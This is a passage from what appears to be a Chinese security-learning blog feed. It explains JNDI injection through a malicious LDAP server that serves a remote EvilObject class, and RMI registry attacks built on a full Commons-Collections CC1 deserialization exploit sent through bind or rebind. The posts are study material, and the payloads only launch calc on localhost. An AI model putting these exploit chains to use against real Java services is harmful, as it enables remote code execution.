href="http://www.ietf.org/rfc/rfc2251.txt">RFC2251</a>(<a href="https://datatracker.ietf.org/doc/rfc4511/">RFC4511</a>) 中，是早期 X.500 DAP (目录访问协议) 的一个子集，因此有时也被称为 <strong>X.500-lite</strong>。</p><p>LDAP Directory 作为一种目录服务，主要用于带有条件限制的对象查询和搜索。目录服务作为一种特殊的数据库，用来保存描述性的、基于属性的详细信息。和传统数据库相比，最大的不同在于目录服务中数据的组织方式，它是一种有层次的树形结构，因此它有优异的读性能，但写性能较差，并且没有事务处理、回滚等复杂功能，不适于存储修改频繁的数据。</p><p>LDAP 的请求和响应是 <strong>ASN.1</strong> 格式，使用二进制的 BER 编码，操作类型(Operation)包括 Bind&#x2F;Unbind、Search、Modify、Add、Delete、Compare 等等，除了这些常规的增删改查操作，同时也包含一些拓展的操作类型和异步通知事件。</p></blockquote><p>首先是添加LDAP的依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.unboundid<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>unboundid-ldapsdk<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>server:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;  </span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;  </span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;  </span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;  </span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;  </span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;  </span><br><span class="line"><span class="keyword">import</span> java.net.URL;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LdapServer</span> &#123;  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;  </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:8000/#EvilObject&quot;</span>;  </span><br><span class="line"> <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">1234</span>;  </span><br><span class="line"> <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);  </span><br><span class="line"> config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(  </span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>,  </span><br><span class="line"> InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>),  </span><br><span class="line"> port,  </span><br><span class="line"> ServerSocketFactory.getDefault(),  </span><br><span class="line"> SocketFactory.getDefault(),  </span><br><span class="line"> (SSLSocketFactory) SSLSocketFactory.getDefault()));  </span><br><span class="line">  </span><br><span class="line"> config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(url)));  </span><br><span class="line"> <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);  </span><br><span class="line"> System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port);  </span><br><span class="line"> ds.startListening();  </span><br><span class="line"> &#125;  </span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line"> &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;  </span><br><span class="line">        <span class="keyword">private</span> URL codebase;  </span><br><span class="line"> <span class="comment">/**  </span></span><br><span class="line"><span class="comment"> * */</span> <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;  </span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;  </span><br><span class="line"> &#125;  </span><br><span class="line">        <span class="comment">/**  </span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@inheritDoc</span>&#125;  </span></span><br><span class="line"><span class="comment"> * * <span class="doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)  </span></span><br><span class="line"><span class="comment"> */</span> <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();  </span><br><span class="line"> <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);  </span><br><span class="line"> <span class="keyword">try</span> &#123;  </span><br><span class="line">                sendResult(result, base, e);  </span><br><span class="line"> &#125;  </span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;  </span><br><span class="line">                e1.printStackTrace();  </span><br><span class="line"> &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException &#123;  </span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));  </span><br><span class="line"> System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);  </span><br><span class="line"> e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;Exploit&quot;</span>);  </span><br><span class="line"> <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();  </span><br><span class="line"> <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);  </span><br><span class="line"> <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;  </span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);  </span><br><span class="line"> &#125;  </span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaCodeBase&quot;</span>, cbstring);  </span><br><span class="line"> e.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaNamingReference&quot;</span>);  </span><br><span class="line"> e.addAttribute(<span class="string">&quot;javaFactory&quot;</span>, <span class="built_in">this</span>.codebase.getRef());  </span><br><span class="line"> result.sendSearchEntry(e);  </span><br><span class="line"> result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>client:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.Client;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LdapClient</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">            <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">            <span class="type">RemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> (RemoteObj) initialContext.lookup(<span class="string">&quot;ldap://localhost:1234/EvilObject&quot;</span>);</span><br><span class="line">            System.out.println(remoteObj.sayHello(<span class="string">&quot;hello&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>python 起一个 HTTP 服务在8000端口存放恶意类即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.Client.RemoteObj;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilObject</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RemoteObj</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvilObject</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello, world!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>注意一点就是，LDAP+Reference的技巧远程加载Factory类不受RMI+Reference中的com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase等属性的限制，所以适用范围更广。但在JDK 8u191、7u201、6u211之后，com.sun.jndi.ldap.object.trustURLCodebase属性的默认值被设置为false，对LDAP Reference远程工厂类的加载增加了限制。</p><p>所以，当JDK版本介于8u191、7u201、6u211与6u141、7u131、8u121之间时，我们就可以利用LDAP+Reference的技巧来进行JNDI注入的利用。</p><p>因此，这种利用方式的前提条件就是目标环境的JDK版本在JDK8u191、7u201、6u211以下。</p></blockquote><p>这里LDAP我还不是很了解, 之后学习了再新开一篇细说</p>]]></content>
      
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>针对RMI的几种攻击方式</title>
      <link href="/2024/07/10/%E9%92%88%E5%AF%B9RMI%E7%9A%84%E5%87%A0%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/"/>
      <url>/2024/07/10/%E9%92%88%E5%AF%B9RMI%E7%9A%84%E5%87%A0%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="客户端攻击注册中心"><a href="#客户端攻击注册中心" class="headerlink" title="客户端攻击注册中心"></a>客户端攻击注册中心</h2><p>客户端请求注册中心有 list, bind, rebind, unbind, lookup这几种方式, 当他们被调用时, 在Registry服务端中<code>RegistryImpl_Skel#dispatch</code>就会对应执行,且往往伴随着反序列化的进行,  这就导致了其易受攻击</p><p>如果你打开查看源码, 会发现dispatch方法下有几个case分支, 他们与调用方法的对应关系如下:</p><ul><li>0 —– bind</li><li>1 —– list</li><li>2 —– lookup</li><li>3 —– rebind</li><li>4 —– unbind</li></ul><p>我们按顺序依次分析:</p><h3 id="bind与rebind"><a href="#bind与rebind" class="headerlink" title="bind与rebind"></a>bind与rebind</h3><p>bind方法对应了你在客户端的这条代码:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">registry.bind(<span class="string">&quot;hello&quot;</span>, rmiHello);</span><br></pre></td></tr></table></figure><p>你是否疑惑, 绑定对象不是在服务器实现的吗, 怎么会造成客户端攻击服务器呢??</p><p>实际上在客户端拿到的注册中心的Stub (客户端拿到的是RegistryImpl_Stub) 中,是有上面提到的所有5种方法的, 因此在Client端也可以使用bind方法, 就是这么简单</p><p>直接看<code>RegistryImpl_Skel#dispatch</code>的源码</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240710140531336.png" alt="image-20240710140531336"></p><p>很容易就发现了反序列化的入口, 这里的var11就是传过来的序列化对象, 因此利用起来也是非常ez     (神马??你问我怎么知道var11是传过来的序列化对象???? 当然是因为它的类型是<code>ObjectInput var11;</code>加上<code>var11 = var2.getInputStream();</code>啦)</p><p>有了反序列化的入口, 配合我们之前学过的CC链, 就可以来一段组合技</p><p>先给注册中心导入CC1的依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>直接拿来CC1的exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">CC1</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchMethodException &#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationconstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationconstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span>  annotationconstructor.newInstance(Target.class, transformedmap);</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在CC1中它的起点是<code>AnnotationInvocationHandler.readObject()</code>, 它正好是一个<code>InvocationHandler</code></p><p>我们知道服务器接收到的对象是一个远程动态代理, 所以还需要稍作修改, </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) CC1();</span><br><span class="line">        <span class="type">Proxy</span> <span class="variable">proxy</span> <span class="operator">=</span> (Proxy) Proxy.newProxyInstance(Remote.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Remote.class&#125;, handler);</span><br><span class="line">        <span class="type">Remote</span> <span class="variable">remote</span> <span class="operator">=</span> Remote.class.cast(proxy);</span><br></pre></td></tr></table></figure><p>这样就得到了一个恶意的远程动态代理</p><p>完整的exp是这样的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>  <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) CC1();</span><br><span class="line">        <span class="type">Proxy</span> <span class="variable">proxy</span> <span class="operator">=</span> (Proxy) Proxy.newProxyInstance(Remote.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Remote.class&#125;, handler);</span><br><span class="line">        <span class="type">Remote</span> <span class="variable">remote</span> <span class="operator">=</span> Remote.class.cast(proxy);</span><br><span class="line"></span><br><span class="line">        registry.bind(<span class="string">&quot;hello&quot;</span>, remote);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">CC1</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchMethodException &#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationconstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationconstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span>  annotationconstructor.newInstance(Target.class, transformedmap);</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用它来请求带有CC1依赖的服务器即可完成攻击</p><p>注:</p><p>rebind 的攻击也是如此，将 <code>registry.bind(&quot;test&quot;,remote);</code> 替换为 <code>rebind(&quot;test&quot;,remote);</code> 方法即可。</p><h3 id="list"><a href="#list" class="headerlink" title="list"></a>list</h3><p><code>list()</code> 方法可以列出目标上所有绑定的对象</p><p>来看list对应的源码</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240710181633835.png" alt="image-20240710181633835"></p><p>因为这里没有 <code>readObject()</code>，所以无法进行反序列化</p><p>因此没有什么利用价值</p><h3 id="lookup与unbind"><a href="#lookup与unbind" class="headerlink" title="lookup与unbind"></a>lookup与unbind</h3><p>这里lookup是有反序列化入口的</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240710182215919.png" alt="image-20240710182215919"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">IHello</span> <span class="variable">ihello</span> <span class="operator">=</span> (IHello) registry.lookup(<span 